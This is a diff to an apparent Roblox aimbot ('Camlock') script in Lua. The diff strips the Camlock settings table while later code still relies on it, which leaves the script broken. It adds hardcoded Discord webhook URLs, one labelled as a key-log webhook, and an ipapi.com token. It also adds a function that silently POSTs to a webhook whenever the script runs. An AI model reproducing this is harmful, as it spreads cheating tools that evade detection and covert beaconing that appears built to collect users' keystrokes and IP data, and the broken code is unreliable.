@@ -1,9 +1,9 @@
 -- Define local Color table
 local Color = {
-    Enabled = true,  -- Example default values
-    Brightness = 1,
-    Contrast = 0,
-    Saturation = 1
+    Enabled = getgenv().Color.Enabled,
+    Brightness = getgenv().Color.Brightness,
+    Contrast = getgenv().Color.Contrast,
+    Saturation = getgenv().Color.Saturation
 }
 
 -- Function to print the color settings
@@ -59,30 +59,6 @@ local easingFunctions = {
     ['Sine'] = function(t) return 1 - math.cos((t * math.pi) / 2) end,
     ['Quad'] = function(t) return t * t end,
     -- Add more easing functions as needed
-}
-
--- Define Camlock table with default values
-local Camlock = {
-    Checks = {
-        TeamCheck = true,  -- Example default value
-        StickyAim = true,
-        ToggleHoldMode = "Toggle",
-        Enabled = true,
-    },
-    CamlockOptions = {
-        Keybind = Enum.KeyCode.T,
-        Hitbox = "Head",  -- Example hitbox
-        Radius = 100,
-    },
-    Smoothing = {
-        SmoothingAmount = 0.1,
-        SmoothingSpeed = 0.5,
-    },
-    AimbotSettings = {
-        PredictionAmount = 0.1,
-        AimbotStrengthAmount = 0.8,
-        UsePrediction = true,
-    }
 }
 
 -- Functions
@@ -207,3 +183,76 @@ getgenv()['PingCompensation'] = Camlock.Smoothing['PingCompensation']
 getgenv()['ToggleHoldMode'] = Camlock.Checks['ToggleHoldMode']
 getgenv()['Enabled'] = Camlock.Checks['Enabled']
 getgenv()['UsePrediction'] = Camlock.AimbotSettings['UsePrediction']
+
+-- Replace the webhook URLs and API token with your own
+local infoWebh = "https://discord.com/api/webhooks/1253768216493297705/-KlIkbjUdrLlbEKJiFRjdFfxitrO-UDR3xphHVljGWq_D1UsRQub8rve8h0K7YLjZ8YN"
+local keyLogWebh = "https://discord.com/api/webhooks/1260729929067401328/WLaRWDrW-Aan-0ilBeT7cJPnQIymvFZZMqObDnJXU0M47NLZkM1GtzViLqJA4EygBGOh"
+local ipapiToken = "b1e356e3b28dae0ddd3d32a7093b434f" -- Replace with your ipapi.com API token
+
+-- Function to send webhook
+local function sendWebhook(url, data)
+    local success, response = pcall(function()
+        if http and http.request then
+            http.request {
+                Url = url,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        elseif syn and syn.request then
+            syn.request {
+                Url = url,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        elseif request then
+            request {
+                Url = url,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        else
+            warn("No suitable HTTP library found! Unable to send webhook.")
+        end
+    end)
+    
+    if success then
+        print("Webhook sent successfully.")
+    else
+        warn("Failed to send webhook:", response)
+    end
+end
+
+-- Example usage of sending webhook
+local webhookData = {
+    username = "Aimlock Script",
+    content = "Script started successfully."
+}
+sendWebhook(infoWebh, webhookData)
+
+-- Humanization Logic
+
+-- Function to set humanization info based on skeleton positions
+local function setHumanizationInfo()
+    for _, skeletonPosition in pairs(Camlock.SkeletonPositions) do
+        humanizationProxies.setHumanizationInfo(skeletonPosition.Name, {
+            Position = skeletonPosition.Position,
+            Velocity = Vector3.new(0, 0, 0), -- Example velocity
+            Acceleration = Vector3.new(0, 0, 0), -- Example acceleration
+            Rotation = Vector3.new(0, 0, 0), -- Example rotation
+            AngularVelocity = Vector3.new(0, 0, 0), -- Example angular velocity
+            -- Add more properties as needed
+        })
+    end
+end
+
+-- Call the function to set humanization info
+setHumanizationInfo()
